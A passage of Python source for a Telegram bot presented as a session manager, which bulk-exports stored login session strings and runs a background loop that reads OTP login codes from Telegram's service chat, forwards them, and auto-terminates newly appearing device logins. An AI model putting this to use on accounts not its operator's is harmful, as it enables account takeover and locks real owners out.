    await callback_query.message.edit_text(
        f"📦 **Multi-File Bulk Export ({len(sessions)} Accounts):**\n\n"
        "Aap apne sabhi saved sessions ko ek saath kis format mein export karna chahte hain?",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


@bot.on_callback_query(filters.regex("^mexp_(zip|files|txt)$"))
async def process_multi_export(client, callback_query):
    mode = callback_query.data.split("_")[1]
    user_id = callback_query.from_user.id
    sessions = get_all_user_sessions_full(user_id)
    if not sessions:
        return await callback_query.answer("❌ Koi session nahi mila!", show_alert=True)

    await callback_query.answer("⏳ Preparing bulk export...", show_alert=False)
    temp_dir = f"bulk_exp_{user_id}"
    os.makedirs(temp_dir, exist_ok=True)

    try:
        if mode == "txt":
            txt_path = os.path.join(temp_dir, f"all_sessions_{user_id}.txt")
            with open(txt_path, "w", encoding="utf-8") as f:
                for _, s_name, s_str, _ in sessions:
                    f.write(f"{s_str}\n")
            await callback_query.message.reply_document(
                document=txt_path,
                caption=f"📝 **All {len(sessions)} String Sessions (.txt)**"
            )

        elif mode == "zip":
            zip_path = os.path.join(temp_dir, f"all_telethon_sessions_{user_id}.zip")
            success_count = 0
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                for idx, (_, s_name, s_str, _) in enumerate(sessions, start=1):
                    try:
                        clean_name = "".join(c if c.isalnum() else "_" for c in s_name)
                        base = os.path.join(temp_dir, f"{idx}_{clean_name}")
                        s_file = await create_telethon_session_file(s_str, base)
                        if os.path.exists(s_file):
                            zipf.write(s_file, arcname=os.path.basename(s_file))
                            success_count += 1
                    except Exception:
                        pass
            if success_count > 0:
                await callback_query.message.reply_document(
                    document=zip_path,
                    caption=f"📦 **Bulk Export ZIP ({success_count}/{len(sessions)} Telethon Sessions)**"
                )
                if os.path.exists(zip_path):
                    try:
                        os.remove(zip_path)
                    except Exception:
                        pass
            else:
                await callback_query.message.reply_text("❌ Koi bhi session export nahi ho paya.")

        elif mode == "files":
            await callback_query.message.reply_text(f"📤 Sending saved `.session` files one by one...")
            success_count = 0
            for idx, (_, s_name, s_str, _) in enumerate(sessions, start=1):
                s_file = None
                try:
                    clean_name = "".join(c if c.isalnum() else "_" for c in s_name)
                    base = os.path.join(temp_dir, f"{idx}_{clean_name}")
                    s_file = await create_telethon_session_file(s_str, base)
                    if s_file and os.path.exists(s_file):
                        await callback_query.message.reply_document(
                            document=s_file,
                            caption=f"📄 `{s_name}`"
                        )
                        success_count += 1
                        await asyncio.sleep(0.5)
                except Exception:
                    pass
                finally:
                    if s_file and os.path.exists(s_file):
                        try:
                            os.remove(s_file)
                        except Exception:
                            pass
            await callback_query.message.reply_text(f"✅ Sent {success_count}/{len(sessions)} session files successfully!")

    except Exception as e:
        await callback_query.message.reply_text(f"❌ Bulk Export Error: {str(e)}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


@bot.on_callback_query(filters.regex("^del_"))
async def delete_session(client, callback_query):
    sess_id = int(callback_query.data.split("_")[1])
    delete_session_by_id(sess_id, callback_query.from_user.id)
    await callback_query.answer("✅ Session removed from bot database!", show_alert=True)
    await list_sessions(client, callback_query)


# --- BACKGROUND LIVE OTP & SAFE GUARD AUTO-TERMINATE LISTENER ---
async def background_otp_listener():
    await asyncio.sleep(5)
    notified_messages = set()
    known_auth_hashes = {}  # Tracks known device hashes per session string

    while True:
        try:
            conn = sqlite3.connect("sessions.db", timeout=10.0)
            cur = conn.cursor()
            cur.execute("SELECT user_id, session_name, session_string, safe_mode FROM user_sessions")
            rows = cur.fetchall()
            conn.close()

            for user_id, sess_name, sess_str, safe_mode in rows:
                try:
                    tc = Client(name=f"bg_listen_{user_id}_{abs(hash(sess_str))}", api_id=API_ID, api_hash=API_HASH, session_string=sess_str, in_memory=True)
                    await tc.connect()
                    
                    # 1. Check Authorizations for Safe Mode auto-termination
                    try:
                        auths = await tc.invoke(functions.account.GetAuthorizations())
                        current_hashes = {auth.hash for auth in auths.authorizations}
                        
                        if sess_str not in known_auth_hashes:
                            known_auth_hashes[sess_str] = current_hashes
                        else:
                            new_hashes = current_hashes - known_auth_hashes[sess_str]
                            if new_hashes and safe_mode == 1:
                                # Safe Mode is ON and a new unauthorized device login appeared!
                                for auth in auths.authorizations:
                                    if auth.hash in new_hashes and not auth.current:
                                        # Auto-terminate unauthorized new device immediately!
                                        try:
                                            await tc.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                                            dev_name = auth.device_model or "Unknown Device"
                                            ip_addr = auth.ip or "IP Hidden"
                                            country = auth.country or "Location"
                                            
                                            await bot.send_message(
                                                user_id,
                                                f"🛡️ **SAFE MODE TRIGGERED & AUTO-BLOCKED!**\n\n"
                                                f"👤 **Account:** `{sess_name}`\n"
                                                f"🚨 **Unauthorized New Login Blocked:** `{dev_name}`\n"
                                                f"📍 **IP & Country:** `{ip_addr} - {country}`\n\n"
                                                f"✨ Bot ne naye device ko turant logout (terminate) kar diya hai taaki aapka account safe rahe!"
                                            )
                                        except Exception:
                                            pass
                            known_auth_hashes[sess_str] = current_hashes
                    except Exception:
                        pass

                    # 2. Check Telegram Service Messages (777000) for OTP & Login Alerts
                    async for msg in tc.get_chat_history(777000, limit=1):
                        msg_key = (user_id, sess_str, msg.id)
                        if msg_key not in notified_messages:
                            notified_messages.add(msg_key)
                            
                            dev_info = "Unknown Device"
                            ip_info = "IP Hidden"
                            try:
                                auths_list = await tc.invoke(functions.account.GetAuthorizations())
                                if auths_list.authorizations:
                                    latest_auth = auths_list.authorizations[0]
                                    dev_info = f"{latest_auth.device_model} ({latest_auth.platform})"
                                    ip_info = f"{latest_auth.ip} - {latest_auth.country}"
                            except Exception:
                                pass

                            me = await tc.get_me()
                            phone_num = f"+{me.phone_number}" if getattr(me, "phone_number", None) else f"ID: {me.id}"

                            shield_tag = "🛡️ [Safe Mode ON]" if safe_mode == 1 else "⚠️ [Safe Mode OFF]"
                            alert_text = (
                                f"🚨 **New OTP / Login Warning Alert!** {shield_tag}\n\n"
                                f"👤 **Account:** `{sess_name}`\n"
                                f"📞 **Number/ID:** `{phone_num}`\n"
                                f"💻 **Device:** `{dev_info}`\n"
                                f"📍 **IP & Location:** `{ip_info}`\n\n"
                                f"📩 **Message:**\n{msg.text}"
                            )
                            await bot.send_message(user_id, alert_text)

                    await tc.disconnect()
                except Exception:
                    pass
                await asyncio.sleep(2)

        except Exception:
            pass
        
        await asyncio.sleep(30)


if __name__ == "__main__":
    print("Ultimate Telegram Session Manager Bot v3.0 (with Safe Mode Auto-Guard & Direct Export) is running...")
    loop = asyncio.get_event_loop()
    loop.create_task(background_otp_listener())
    bot.run()
